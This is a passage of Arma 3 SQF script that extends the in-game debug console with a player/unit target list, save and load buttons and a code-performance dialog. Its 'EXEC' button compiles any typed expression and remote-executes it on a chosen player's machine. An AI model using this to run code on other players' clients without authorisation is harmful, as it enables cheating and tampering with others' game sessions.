                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonGUI'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonGUI'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_GUIeditor;
                                            }];
                                        };

                                        if (_ctrlIDC == 13287) then {
                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonSpectatorCamera'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonSpectatorCamera'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_EGSpectator;
                                            }];
                                        };

                                        if (_ctrlIDC == 13288) then {
                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonSplendidCamera'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonSplendidCamera'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_camera;
                                            }];
                                        };

                                        if (_ctrlIDC == 13291) then {
                                            uinamespace setvariable[''JAM_ctrl_OfficialDebugConsole_ButtonAnimations'', (_pauseMenu displayctrl _ctrlIDC)];
                                            (uinamespace getvariable ''JAM_ctrl_OfficialDebugConsole_ButtonAnimations'') ctrladdEventHandler["ButtonClick", {
                                                [] spawn JAM_fnc_animViewer;
                                            }];
                                        };

                                        if (_ctrlIDC == 13190) then {
                                            uiNameSpace setVariable[''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'', _pauseMenu displayctrl _ctrlIDC];
                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetText(profileNamespace getVariable["JAM_debugConsole_lastExpressionOutput", ""]);
                                            (uiNameSpace getVariable ''JAM_ctrl_OfficialDebugConsole_ExpressionOutput'') ctrlSetBackgroundColor(profileNameSpace getVariable["JAM_debugConsole_lastExpressionOutputColor", [0, 0, 0, 0.7]]);
                                        };

                                        _ctrl ctrlcommit 0;

                                    }
                                    forEach allControls _pauseMenu;
                                    comment "{
                                    if (ctrlParentControlsGroup _x == _debugConsole) then {
                                        _x ctrlShow true;
                                        _x ctrlEnable true;
                                        _x ctrlCommit 0;
                                    };
                                }
                                forEach allControls _pauseMenu;
                                ";
                                _title = _pauseMenu displayCtrl 11884;
                                _title ctrlSetText(format["Enhanced Debug Console %1", missionNamespace getVariable[''EDC_versionStr'', '''']]);
                                _title ctrlCommit 0;

                                _expression = _pauseMenu displayCtrl 12284;
                                _expressionPos = ctrlPosition _expression;
                                comment "
                                2 D position format: [x, y, w, h]
                                    [0, 1, 2, 3]
                                ";
                                _expressionPos set[2, (_expressionPos# 2) / 2];
                                _expression ctrlSetPosition _expressionPos;
                                _expression ctrlSetBackgroundColor[0, 0, 0, 0.3];
                                _expression ctrlCommit 0;
                                _expressiontxt = ctrlText _expression;
                                _expression ctrlSetText _expressiontxt;
                                _expression ctrlCommit 0;

                                comment "//--- Set focus to expression field";

                                ctrlSetFocus _expression;
                                _expression ctrlCommit 0;

                                private _expressionHistory = profileNamespace getVariable["RscDebugConsole_expressionHistory", []];
                                if (_expressionHistory isEqualTo[]) then {
                                    profileNamespace setvariable["RscDebugConsole_expressionHistory", [_expressiontxt]];
                                    _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                                };
                                _pauseMenu setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                                _expressionText = _pauseMenu displayCtrl 11892;
                                _expressionTextPos = ctrlPosition _expressionText;
                                _expressionTextText = ctrlText _expressionText;
                                _expressionTextText = (_expressionTextText + "                                                                      Target");
                                _expressionText ctrlSetText _expressionTextText;
                                _expressionText ctrlCommit 0;

                                _targetsPosX = _expressionPos# 0;
                                _targetsPosY = _expressionPos# 1;
                                _targetsPosW = _expressionPos# 2;
                                _targetsPosH = _expressionPos# 3;
                                _targetsPos = [
                                    _targetsPosX + 0.315,
                                    _targetsPosY,
                                    _targetsPosW,
                                    _targetsPosH
                                ];

                                _targetsFramePos = _targetsPos;
                                _targetsFramePos set[2, (_targetsFramePos# 2) + 0.002];

                                _targetsFrame = _pauseMenu ctrlCreate["RscFrame", -1, _debugConsole];
                                _targetsFrame ctrlSetPosition _targetsFramePos;
                                _targetsFrame ctrlSetBackgroundColor[0, 0, 0, 0];
                                _targetsFrame ctrlSetTextColor[1, 1, 1, 1];
                                _targetsFrame ctrlCommit 0;


                                _ctrl_targets = _pauseMenu ctrlCreate["RscListBox", -1, _debugConsole];
                                uiNameSpace setVariable["EDC_ctrl_targets", _ctrl_targets];
                                _ctrl_targets ctrlSetPosition _targetsPos;
                                _ctrl_targets ctrlSetBackgroundColor[0, 0, 0, 0];
                                if (profileNamespace getVariable["EDC_listAllUnits", false]) then {
                                    [] call(missionNamespace getVariable["EDC_fnc_listUnits_GUI", {}]);
                                } else {
                                    [] call(missionNamespace getVariable["EDC_fnc_listPlayers_GUI", {}]);
                                };
                                _ctrl_targets ctrlCommit 0;


                                _buttonCodePerformance = _pauseMenu displayCtrl 13284;
                                _buttonCodePerformancePos = ctrlPosition _buttonCodePerformance;
                                _buttonCodePerformance ctrlRemoveAllEventHandlers "ButtonClick";
                                _buttonCodePerformance ctrlRemoveAllEventHandlers "ButtonDblClick";
                                _buttonCodePerformance ctrlRemoveAllEventHandlers "ButtonDown";
                                _buttonCodePerformance ctrlRemoveAllEventHandlers "ButtonUp";
                                _buttonCodePerformance ctrlAddEventHandler["ButtonClick", {
                                    with uiNameSpace do {
                                        disableSerialization;
                                        _previousExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];
                                        _expressionCtrl = (findDisplay 49) displayCtrl 12284;
                                        _currentExpression = ctrlText _expressionCtrl;
                                        profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
                                        comment "saveProfileNamespace;";
                                    };
                                    []
                                    spawn EDC_fnc_codePerformance;
                                }];
                                _buttonCodePerformance ctrlCommit 0;

                                _buttonExecuteTargetPosX = _buttonCodePerformancePos# 0;
                                _buttonExecuteTargetPosY = _buttonCodePerformancePos# 1;
                                _buttonExecuteTargetPosW = _buttonCodePerformancePos# 2;
                                _buttonExecuteTargetPosH = _buttonCodePerformancePos# 3;
                                _buttonExecuteTargetPos = [
                                    _buttonExecuteTargetPosX + 0.539,
                                    _buttonExecuteTargetPosY,
                                    _buttonExecuteTargetPosW + 0.091,
                                    _buttonExecuteTargetPosH
                                ];

                                _buttonExecuteTarget = _pauseMenu ctrlCreate["RscButtonMenu", -1, _debugConsole];
                                _buttonExecuteTarget ctrlSetPosition _buttonExecuteTargetPos;
                                _buttonExecuteTarget ctrlSetStructuredText parseText(''<t valign="middle" font="PuristaLight" shadow="0" size="0.85"><img image="\a3\ui_f\data\GUI\rsc\RscDisplayGarage\crew_ca.paa"></img><t size="1">EXEC</t>'');
                                _buttonExecuteTarget ctrlAddEventHandler["ButtonClick", {
                                    params["_control"];
                                    with uiNamespace do {
                                        disableSerialization;
                                        _parentDisplay = ctrlParent _control;
                                        _index = lbCurSel(uiNameSpace getVariable ''EDC_ctrl_targets'');
                                        _text = (uiNameSpace getVariable ''EDC_ctrl_targets'') lbText _index;
                                        _expressionCtrl = (findDisplay 49) displayCtrl 12284;

                                        private _expressionHistory = profileNamespace getVariable["RscDebugConsole_expressionHistory", []];
                                        private _currentExpression = ctrlText _expressionCtrl;
                                        if (_expressionHistory isEqualTo[]) then {
                                            profileNamespace setvariable["RscDebugConsole_expressionHistory", [_currentExpression]];
                                            _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                                        };
                                        _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                                        private _lastExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];

                                        if (_lastExpression isEqualTo "" || _currentExpression isEqualTo _lastExpression) then {
                                            _expressionHistory set[count _expressionHistory - 1, _currentExpression];
                                        }
                                        else {
                                            if (_expressionHistory pushBack _currentExpression >= 10) then {
                                                _expressionHistory deleteRange[0, count _expressionHistory - 10]
                                            };
                                        };

                                        profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
                                        _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                                        comment "saveProfileNamespace;";

                                        with missionNamespace do {
                                            _targetsArray_01 = [];
                                            if (profileNamespace getVariable[''EDC_listAllUnits'', false]) then {
                                                _targetsArray_01 = [] call EDC_fnc_listUnits;
                                            } else {
                                                _targetsArray_01 = [] call EDC_fnc_listPlayers;
                                            }; {
                                                if (name _x == _text) exitWith {

                                                    _expressionText = [_currentExpression] call EDC_fnc_removeComments;
                                                    _target = _x;

                                                    _fnc = compile _expressionText;
                                                    EDC_RE_fnc_trgtExec = [''a'', _fnc, ''b''];

                                                    publicVariable ''EDC_RE_fnc_trgtExec'';

                                                    if (isPlayer _target) then {

                                                        [
                                                            [], {
                                                                [] spawn(EDC_RE_fnc_trgtExec select 1);
                                                            }
                                                        ] remoteExec[''spawn'', _target];

                                                    } else {

                                                        [
                                                            [], {
                                                                [] spawn(EDC_RE_fnc_trgtExec select 1);
                                                            }
                                                        ] remoteExec[''spawn'', owner _target];

                                                    };

                                                    playsound ''additemok'';

                                                };
                                            }
                                            forEach _targetsArray_01;
                                        };
                                    };
                                }];
                                _buttonExecuteTarget ctrlCommit 0;
                                comment "if (!isMultiplayer) then {
                                _buttonExecuteTarget ctrlEnable false;
                            };
                            ";

                            _buttonExecuteServer = _pauseMenu displayCtrl 13286;
                            _buttonExecuteAll = _pauseMenu displayCtrl 13285;
                            _buttonExecuteLocal = _pauseMenu displayCtrl 13484;
                            _buttonExecuteServerPos = ctrlPosition _buttonExecuteServer;
                            _buttonExecuteAllPos = ctrlPosition _buttonExecuteAll;
                            _buttonExecuteLocalPos = ctrlPosition _buttonExecuteLocal;

                            _PercentShrinkage = 0.8;
                            _ShiftAmount_all = 0.041;
                            _ShiftAmount_local = 0.083;

                            _buttonExecuteServerPos set[2, (_buttonExecuteServerPos# 2) * _PercentShrinkage];
                            _buttonExecuteAllPos set[2, (_buttonExecuteAllPos# 2) * _PercentShrinkage];
                            _buttonExecuteLocalPos set[2, (_buttonExecuteLocalPos# 2) * _PercentShrinkage];

                            _buttonExecuteAllPos set[0, (_buttonExecuteAllPos# 0) - _ShiftAmount_all];
                            _buttonExecuteLocalPos set[0, (_buttonExecuteLocalPos# 0) - _ShiftAmount_local];

                            _buttonExecuteServer ctrlSetPosition _buttonExecuteServerPos;
                            _buttonExecuteAll ctrlSetPosition _buttonExecuteAllPos;
                            _buttonExecuteLocal ctrlSetPosition _buttonExecuteLocalPos;

                            {
                                comment "fix disabled controls";

                                comment "adjust control positions";
                                if (ctrlClassName _x == ''ButtonExecuteServerBackground'') then {
                                    _x ctrlSetPosition _buttonExecuteServerPos;
                                    _x ctrlCommit 0;
                                };
                                if (ctrlClassName _x == ''ButtonExecuteAllBackground'') then {
                                    _x ctrlSetPosition _buttonExecuteAllPos;
                                    _x ctrlCommit 0;
                                };
                                if (ctrlClassName _x == ''ButtonExecuteLocalBackground'') then {
                                    _x ctrlSetPosition _buttonExecuteLocalPos;
                                    _x ctrlCommit 0;
                                };
                            }
                            forEach allControls _pauseMenu;

                            _buttonExecuteServer ctrlCommit 0;
                            _buttonExecuteAll ctrlCommit 0;
                            _buttonExecuteLocal ctrlCommit 0;

                            _expressionOutput = _pauseMenu displayCtrl 13190;
                            comment ''_expressionOutputBackground = _pauseMenu displayCtrl 13191;'';
                            _expressionOutputPos = ctrlPosition _expressionOutput;
                            comment ''_expressionOutputBackgroundPos = ctrlPosition _expressionOutputBackground;'';
                            _expressionOutputPos set[2, (_expressionOutputPos# 2) / 2];
                            comment ''_expressionOutputBackgroundPos set [2,(_expressionOutputBackgroundPos # 2) / 2];'';
                            _expressionOutput ctrlSetPosition _expressionOutputPos;
                            comment ''_expressionOutputBackground ctrlSetPosition _expressionOutputBackgroundPos;'';
                            comment ''_expressionOutputBackground ctrlSetPosition _expressionOutputPos;'';
                            _expressionOutput ctrlCommit 0;
                            comment ''_expressionOutputBackground ctrlCommit 0;'';

                            _newBackground_01Pos = ctrlPosition _expressionOutput;
                            _newBackground_01Pos set[0, (_newBackground_01Pos# 0) + 0.3155];
                            _newBackground_01 = _pauseMenu ctrlCreate["RscText", -1, _debugConsole];
                            _newBackground_01 ctrlSetPosition _newBackground_01Pos;
                            _newBackground_01 ctrlSetBackgroundColor[0, 0, 0, 0.8];
                            _newBackground_01 ctrlEnable false;
                            _newBackground_01 ctrlCommit 0;

                            _shifter_01 = 0.025;

                            _allUnitsTextPos = _expressionOutputPos;
                            _allUnitsTextPos set[0, (_allUnitsTextPos# 0) + 0.35 + _shifter_01];
                            _allUnitsText = _pauseMenu ctrlCreate["RscStructuredText", -1, _debugConsole];
                            _allUnitsText ctrlSetPosition _allUnitsTextPos;
                            _allUnitsText ctrlSetBackgroundColor[0, 0, 0, 0];
                            _allUnitsText ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''1'' align=''left'' valign=''middle''>allUnits</t>");
                            _allUnitsText ctrlCommit 0;

                            _allUnitsCheckBoxPos = _buttonCodePerformancePos;
                            _allUnitsCheckBoxPos set[0, (_allUnitsCheckBoxPos# 0) + 0.34 + _shifter_01];
                            _allUnitsCheckBoxPos set[1, (_allUnitsTextPos# 1)];

                            uiNameSpace setVariable[''EDC_ctrl_allUnitsCheckBox'', _pauseMenu ctrlCreate["RscCheckbox", -1, _debugConsole]];
                            (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrlSetPosition _allUnitsCheckBoxPos;
                            (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrladdEventHandler["ButtonClick", {
                                if (profileNamespace getVariable[''EDC_listAllUnits'', false]) then {
                                    profileNamespace setVariable[''EDC_listAllUnits'', false];
                                    [] call EDC_fnc_listPlayers_GUI;
                                    comment "saveProfileNamespace;";
                                }
                                else {
                                    profileNamespace setVariable[''EDC_listAllUnits'', true];
                                    [] call EDC_fnc_listUnits_GUI;
                                    comment "saveProfileNamespace;";
                                };
                            }];
                            (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') cbSetChecked(
                                if (profileNamespace getVariable[''EDC_listAllUnits'', false]) then {
                                    true
                                } else {
                                    false
                                });
                            (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrlCommit 0;

                            _allPlayersTextPos = _allUnitsTextPos;
                            _allPlayersTextPos set[0, (_allPlayersTextPos# 0) + 0.15 - _shifter_01];
                            _allPlayersText = _pauseMenu ctrlCreate["RscStructuredText", -1, _debugConsole];
                            _allPlayersText ctrlSetPosition _allPlayersTextPos;
                            _allPlayersText ctrlSetBackgroundColor[0, 0, 0, 0];
                            _allPlayersText ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''1'' align=''left'' valign=''middle''>allPlayers</t>");
                            _allPlayersText ctrlCommit 0;

                            _allPlayersCheckBoxPos = _allUnitsCheckBoxPos;
                            _allPlayersCheckBoxPos set[0, (_allPlayersCheckBoxPos# 0) + 0.15 - _shifter_01];

                            uiNameSpace setVariable[''EDC_ctrl_allPlayersCheckBox'', _pauseMenu ctrlCreate["RscCheckbox", -1, _debugConsole]];
                            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrlSetPosition _allPlayersCheckBoxPos;
                            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrladdEventHandler["ButtonClick", {
                                if (profileNamespace getVariable[''EDC_listAllUnits'', false]) then {
                                    profileNamespace setVariable[''EDC_listAllUnits'', false];
                                    [] call EDC_fnc_listPlayers_GUI;
                                    comment "saveProfileNamespace;";
                                }
                                else {
                                    profileNamespace setVariable[''EDC_listAllUnits'', true];
                                    [] call EDC_fnc_listUnits_GUI;
                                    comment "saveProfileNamespace;";
                                };
                            }];
                            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') cbSetChecked(
                                if (profileNamespace getVariable[''EDC_listAllUnits'', false]) then {
                                    false
                                } else {
                                    true
                                });
                            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrlCommit 0;

                            _buttonSpectatorCamera = _pauseMenu displayCtrl 13287;
                            _buttonSpectatorCameraPos = ctrlPosition _buttonSpectatorCamera;
                            _buttonSpectatorCameraPos set[2, (_buttonSpectatorCameraPos# 2) * (2 / 3)];
                            _buttonSpectatorCamera ctrlSetPosition _buttonSpectatorCameraPos;
                            _buttonSpectatorCamera ctrlCommit 0;

                            _ButtonSplendidCamera = _pauseMenu displayCtrl 13288;
                            _ButtonSplendidCameraPos = ctrlPosition _ButtonSplendidCamera;
                            _ButtonSplendidCameraPos set[2, (_ButtonSplendidCameraPos# 2) * (2 / 3)];
                            _ButtonSplendidCamera ctrlSetPosition _ButtonSplendidCameraPos;
                            _ButtonSplendidCamera ctrlCommit 0;

                            _ButtonFunctions = _pauseMenu displayctrl 13289;
                            _ButtonFunctionsPos = ctrlPosition _ButtonFunctions;
                            _ButtonFunctionsPos set[2, (_ButtonFunctionsPos# 2) * (2 / 3)];
                            _ButtonFunctionsPos set[0, (_ButtonFunctionsPos# 0) - 0.074];
                            _ButtonFunctions ctrlSetPosition _ButtonFunctionsPos;
                            _ButtonFunctions ctrlCommit 0;

                            _ButtonConfig = _pauseMenu displayctrl 13290;
                            _ButtonConfigPos = ctrlPosition _ButtonConfig;
                            _ButtonConfigPos set[2, (_ButtonConfigPos# 2) * (2 / 3)];
                            _ButtonConfigPos set[0, (_ButtonConfigPos# 0) - 0.074];
                            _ButtonConfig ctrlSetPosition _ButtonConfigPos;
                            _ButtonConfig ctrlCommit 0;

                            _ButtonAnimations = _pauseMenu displayctrl 13291;
                            _ButtonAnimationsPos = ctrlPosition _ButtonAnimations;
                            _buttonSaveScriptPos = ctrlPosition _ButtonAnimations;
                            _ButtonAnimationsPos set[2, (_ButtonAnimationsPos# 2) * (2 / 3)];
                            _ButtonAnimationsPos set[0, (_ButtonAnimationsPos# 0) - (0.074 * 2)];
                            _ButtonAnimations ctrlSetPosition _ButtonAnimationsPos;
                            _ButtonAnimations ctrlCommit 0;

                            _ButtonGUI = _pauseMenu displayctrl 13292;
                            _ButtonGUIPos = ctrlPosition _ButtonGUI;
                            _buttonLoadScriptPos = ctrlPosition _ButtonGUI;
                            _ButtonGUIPos set[2, (_ButtonGUIPos# 2) * (2 / 3)];
                            _ButtonGUIPos set[0, (_ButtonGUIPos# 0) - (0.074 * 2)];
                            _ButtonGUI ctrlSetPosition _ButtonGUIPos;
                            _ButtonGUI ctrlCommit 0;

                            _buttonSaveScriptPos set[0, (_buttonSaveScriptPos# 0) - 0.0045];
                            _buttonSaveScriptPos set[2, (_buttonSaveScriptPos# 0) + 0.0045];

                            _buttonSaveScript = _pauseMenu ctrlCreate["RscButtonMenu", -1, _debugConsole];
                            _buttonSaveScript ctrlSetPosition _buttonSaveScriptPos;
                            _buttonSaveScript ctrlSetStructuredText parseText("<t valign=''middle'' font=''PuristaLight'' shadow=''0'' size=''0.75''><img image=''\a3\ui_f\data\map\markers\military\end_CA.paa''></img><img image=''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''></img><t size=''1''> SAVE SCRIPT</t>");
                            _buttonSaveScript ctrlAddEventHandler["ButtonClick", {
                                params["_control"];
                                with uiNamespace do {
                                    disableSerialization;
                                    _parentDisplay = ctrlParent _control;
                                    _expressionCtrl = _parentDisplay displayCtrl 12284;
                                    _currentExpression = ctrlText _expressionCtrl;
                                    with missionnamespace do {
                                        [_currentExpression] spawn EDC_fnc_saveScript;
                                    };
                                };
                            }];
                            _buttonSaveScript ctrlCommit 0;

                            _buttonLoadScriptPos set[0, (_buttonLoadScriptPos# 0) - 0.0045];
                            _buttonLoadScriptPos set[2, (_buttonLoadScriptPos# 0) + 0.0045];

                            _buttonLoadScript = _pauseMenu ctrlCreate["RscButtonMenu", -1, _debugConsole];
                            _buttonLoadScript ctrlSetPosition _buttonLoadScriptPos;
                            _buttonLoadScript ctrlSetStructuredText parseText("<t valign=''middle'' font=''PuristaLight'' shadow=''0'' size=''0.75''><img image=''\a3\ui_f\data\map\markers\military\start_CA.paa''></img><img image=''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''></img><t size=''1''> LOAD SCRIPT</t>");
                            _buttonLoadScript ctrlAddEventHandler["ButtonClick", {
                                [] spawn EDC_fnc_loadScript;
                            }];
                            _buttonLoadScript ctrlCommit 0;
                        };
                        _debugConsole ctrlShow true;
                        _debugConsole ctrlEnable true;
                        _debugConsole ctrlCommit 0;
                    };
                    _showServerUptime = [] spawn {
                        with uiNameSpace do {
                            _disp = findDisplay 49;
                            while {
                                !isNull _disp
                            }
                            do {
                                _ctrl = _disp displayCtrl 109;
                                _ctrl ctrlSetText(format[''Uptime: %1'', [time / 3600] call bis_fnc_timetostring]);
                                _ctrl ctrlCommit 0;
                                uiSleep 1;
                            };
                        };
                    };
                };

                EDC_fnc_gamePaused2 = {
                    waitUntil {
                        (!isNull findDisplay 49)
                    };
                    if (!isNull findDisplay 49) exitWith {
                        [] spawn EDC_fnc_editDebugConsole_old2;
                    };
                };

                [] spawn EDC_fnc_gamePaused2
            };

            [] spawn EDC_fnc_initMain;

        };
        [] spawn BIS_fnc_enableDebugConsole;
    };
    edc_fnc_codeperformance = {
        if (isNull(findDisplay 49)) exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        with uiNamespace do {
            disableSerialization;

            EDC_display_codePerformanceOptions = (findDisplay 49) createDisplay "RscDisplayEmpty";
            showChat true;

            _txtSize = safeZoneH * 0.5;

            _ctrl_ttlCPOptns = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_ttlCPOptns ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.225 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
            _ctrl_ttlCPOptns ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
            _ctrl_ttlCPOptns ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Code Performance Test - Options</t>");
            _ctrl_ttlCPOptns ctrlCommit 0;

            _ctrl_CPbkrnd1 = EDC_display_codePerformanceOptions ctrlCreate["RscText", -1];
            _ctrl_CPbkrnd1 ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.258 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.484 * safezoneH];
            _ctrl_CPbkrnd1 ctrlSetBackgroundColor[-1, -1, -1, 0.7];
            _ctrl_CPbkrnd1 ctrlCommit 0;

            _ctrl_CPbkrnd2 = EDC_display_codePerformanceOptions ctrlCreate["RscText", -1];
            _ctrl_CPbkrnd2 ctrlSetPosition[0.381406 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.237187 * safezoneW, 0.022 * safezoneH];
            _ctrl_CPbkrnd2 ctrlSetBackgroundColor[-1, -1, -1, 0.8];
            _ctrl_CPbkrnd2 ctrlCommit 0;

            _ctrl_ttlCPExp = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_ttlCPExp ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.258 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
            _ctrl_ttlCPExp ctrlSetBackgroundColor[-1, -1, -1, 0];
            _ctrl_ttlCPExp ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Expression:</t>");
            _ctrl_ttlCPExp ctrlCommit 0;

            _ctrl_ttlCPArg = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_ttlCPArg ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.599 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
            _ctrl_ttlCPArg ctrlSetBackgroundColor[-1, -1, -1, 0];
            _ctrl_ttlCPArg ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Arguments:</t>");
            _ctrl_ttlCPArg ctrlCommit 0;

            _ctrl_ttlCPCyc = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_ttlCPCyc ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.643 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
            _ctrl_ttlCPCyc ctrlSetBackgroundColor[-1, -1, -1, 0];
            _ctrl_ttlCPCyc ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Cycles:</t>");
            _ctrl_ttlCPCyc ctrlCommit 0;

            _ctrl_ttlCPDis = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_ttlCPDis ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.687 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
            _ctrl_ttlCPDis ctrlSetBackgroundColor[-1, -1, -1, 0];
            _ctrl_ttlCPDis ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Display:</t>");
            _ctrl_ttlCPDis ctrlCommit 0;

            _ctrl_btnCPCancel = EDC_display_codePerformanceOptions ctrlCreate["RscButtonMenu", -1];
            _ctrl_btnCPCancel ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.0825 * safezoneW, 0.022 * safezoneH];
            _ctrl_btnCPCancel ctrlSetBackgroundColor[0, 0, 0, 0.8];
            _ctrl_btnCPCancel ctrlSetStructuredText parseText("<t shadow=''0'' size=''" + (str(_txtSize * 1)) + "'' align=''center'' valign=''middle''>CANCEL</t>");
            _ctrl_btnCPCancel ctrladdEventHandler["ButtonClick", {
                (uiNamespace getVariable ''EDC_display_codePerformanceOptions'') closeDisplay 2;
                if (!(isNull(finddisplay 49))) then {
                    showChat false;
                };

            }];
            _ctrl_btnCPCancel ctrlCommit 0;

            EDC_ctrl_CPOExpression = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
            EDC_ctrl_CPOExpression ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.319 * safezoneH];
            EDC_ctrl_CPOExpression ctrlSetBackgroundColor[-1, -1, -1, 0.4];
            EDC_ctrl_CPOExpression ctrlSetText(profileNamespace getVariable["RscDebugConsole_expression", "comment ''input expression'';"]);
            EDC_ctrl_CPOExpression ctrlCommit 0;

            EDC_ctrl_CPOArguments = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
            EDC_ctrl_CPOArguments ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.621 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
            EDC_ctrl_CPOArguments ctrlSetBackgroundColor[-1, -1, -1, 0.4];
            EDC_ctrl_CPOArguments ctrlSetText "[]";
            EDC_ctrl_CPOArguments ctrlCommit 0;

            EDC_ctrl_CPOCycles = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
            EDC_ctrl_CPOCycles ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.665 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
            EDC_ctrl_CPOCycles ctrlSetBackgroundColor[-1, -1, -1, 0.4];
            EDC_ctrl_CPOCycles ctrlSetText "1";
            EDC_ctrl_CPOCycles ctrlCommit 0;

            EDC_ctrl_CPODisplay = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
            EDC_ctrl_CPODisplay ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.709 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
            EDC_ctrl_CPODisplay ctrlSetBackgroundColor[-1, -1, -1, 0.4];
            EDC_ctrl_CPODisplay ctrlSetText "(findDisplay 49)";
            EDC_ctrl_CPODisplay ctrlCommit 0;

            _ctrl_btnCPStart = EDC_display_codePerformanceOptions ctrlCreate["RscButtonMenu", -1];
            _ctrl_btnCPStart ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.0825 * safezoneW, 0.022 * safezoneH];
            _ctrl_btnCPStart ctrlSetBackgroundColor[0, 0, 0, 0.8];
            _ctrl_btnCPStart ctrlSetStructuredText parseText("<t shadow=''0'' size=''" + (str(_txtSize * 0.7)) + "'' align=''left'' valign=''middle''><img image=''\a3\Ui_f\data\GUI\RscCommon\RscDebugConsole\performance_ca.paa''></img><t align=''left'' size=''" + (str(_txtSize * 1)) + "''>  START TEST</t>");
            _ctrl_btnCPStart ctrladdEventHandler["ButtonClick", {
                _parentDisplay = (findDisplay 49);
                _expression_input = '''';
                _arguments_input = '''';
                _cycles_input = '''';
                _display_input = '''';

                with uiNameSpace do {
                    _expression_input = ctrlText EDC_ctrl_CPOExpression;
                    _arguments_input = ctrlText EDC_ctrl_CPOArguments;
                    _cycles_input = ctrlText EDC_ctrl_CPOCycles;
